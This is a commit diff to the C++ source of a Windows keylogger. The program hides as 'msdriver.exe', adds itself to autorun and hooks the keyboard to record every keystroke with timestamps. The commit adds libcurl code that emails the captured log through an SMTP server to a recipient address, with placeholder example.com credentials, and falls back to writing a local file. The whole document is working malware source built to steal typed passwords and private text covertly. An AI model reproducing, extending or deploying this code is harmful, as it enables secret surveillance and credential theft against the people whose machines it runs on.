860322acd677aed345ac9fd7390e7ec1453efbe2
zorggish <xenomat@yandex.ru>
2021-01-14 18:17:35 +0300

    Email support

--- main.cpp
+++ main.cpp
@@ -9,7 +9,14 @@
 #include <WinBase.h>
 #include <tchar.h>
 
+#include <curl/curl.h>
+
 typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
+using std::string;
+enum workMode{
+	sendLogEmail,
+	writeLogFile
+};
 
 //Settings
 tstring executableFileName(_T("msdriver.exe"));
@@ -18,15 +25,28 @@ tstring dirPath(_T("c:\\driver"));
 bool	copyToAutorun = true;
 int		timerPeriodSeconds = 3;
 
+//Mail settings
+string login      = "sender@example.com";
+string password   = "password";
+string URL        = "smtp://smtp.example.com:587";
+string repicient  = "repicient@example.com";
+bool trySendEmail = true;
+
 //Global variables
-tstring keyLog;
+string keyLog;
 HANDLE logFileHandle;
 MSG msg;
+string header = "To: " + repicient + "\r\n" +
+			    "From: " + login + " (DuckCpp log sender)\r\n" +
+			    "Subject: Log\r\n\r\n";
+workMode mode = trySendEmail ? sendLogEmail : writeLogFile;
+
 
 //Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
 void processLog();
+bool sendMail();
 
 //Main
 int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
@@ -73,8 +93,8 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	}
 
 	KillTimer(NULL, 1); //Destroy timer
-	CloseHandle(logFileHandle); //Close file handle
 	processLog();
+	CloseHandle(logFileHandle); //Close file handle
 	return 0;
 }
 
@@ -84,31 +104,25 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 	if (code == HC_ACTION && wParam == WM_KEYDOWN)
 	{
 		//Time
-		WCHAR timeBuf[10];
+		char timeBuf[10];
 		SYSTEMTIME st;
 		GetLocalTime(&st);
-		_stprintf(timeBuf, _T("%.2u:%.2u:%.2u "), st.wHour, st.wMinute, st.wSecond);
-		tstring line(timeBuf);
+		sprintf(timeBuf, "%.2u:%.2u:%.2u ", st.wHour, st.wMinute, st.wSecond);
+		string line(timeBuf);
 
 		//Virtual key code
 		DWORD vkCode = (((LPKBDLLHOOKSTRUCT)lParam)->vkCode);
 
 		//Modifiers
-		if (vkCode != VK_SHIFT && GetAsyncKeyState(VK_SHIFT)) line += _T("SHIFT + ");
-		if (vkCode != VK_CONTROL && GetAsyncKeyState(VK_CONTROL)) line += _T("CTRL + ");
-		if (vkCode != VK_MENU && GetAsyncKeyState(VK_MENU)) line += _T("ALT + ");
+		if (vkCode != VK_SHIFT && GetAsyncKeyState(VK_SHIFT)) line += "SHIFT + ";
+		if (vkCode != VK_CONTROL && GetAsyncKeyState(VK_CONTROL)) line += "CTRL + ";
+		if (vkCode != VK_MENU && GetAsyncKeyState(VK_MENU)) line += "ALT + ";
 
-		//A-Z
-		if (vkCode >= 0x41 && vkCode <= 0x5A)
-			line += (TCHAR)vkCode;
-		else
-		{ //Other Keys
-			TCHAR keyName[20];
-			GetKeyNameText(MapVirtualKey(vkCode, NULL) << 16, keyName, 20);
-			line.append(keyName);
-		}
+		char keyName[20];
+		GetKeyNameTextA(MapVirtualKeyA(vkCode, NULL) << 16, keyName, 20);
+		line.append(keyName);
 
-		keyLog += line + _T("\n");
+		keyLog += line + "\n";
 		line.clear();
 	}
 	return 0;
@@ -122,7 +136,70 @@ VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
 
 void processLog()
 {
-	DWORD numberOfBytesWritten;
-	WriteFile(logFileHandle, keyLog.c_str(), _tcslen(keyLog.c_str()) * sizeof(TCHAR), &numberOfBytesWritten, NULL);
+	if (mode == sendLogEmail)
+	{
+		if (!sendMail())
+			mode = writeLogFile; //Fail sending mail; will write to file
+	}
+	if (mode == writeLogFile)
+	{
+		DWORD numberOfBytesWritten;
+		WriteFile(logFileHandle, keyLog.c_str(), keyLog.length(), &numberOfBytesWritten, NULL);
+	}
 	keyLog.clear();
+}
+
+static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp)
+{
+	static int callNumber = 0; //Call number counter, 0 - header, 1 - body, 2 - send mail
+	
+	struct upload_status {
+		int lines_read;
+	} *upload_ctx = (upload_status*)userp;
+
+	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
+		return 0;
+
+	string& data = (callNumber == 0 ? header : keyLog);
+
+	if (++callNumber == 3) {
+		callNumber = 0;
+		return 0;
+	}
+
+	memcpy(ptr, data.c_str(), data.length());
+	upload_ctx->lines_read++;
+	return data.length();
+}
+
+bool sendMail()
+{
+	CURL* curl = curl_easy_init();
+	CURLcode res = CURLE_OK;
+
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_USERNAME, login.c_str());
+		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
+		curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
+		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, login.c_str());
+
+		struct curl_slist* recipients = NULL;
+		recipients = curl_slist_append(recipients, repicient.c_str());
+		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
+
+		curl_easy_setopt(curl, CURLOPT_READFUNCTION, readfunc);
+		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+
+		res = curl_easy_perform(curl);
+
+		curl_slist_free_all(recipients);
+
+		if (res != CURLE_OK)
+			return false;
+		
+		curl_easy_cleanup(curl);
+
+		return true;
+	}
+	else return false;
 }
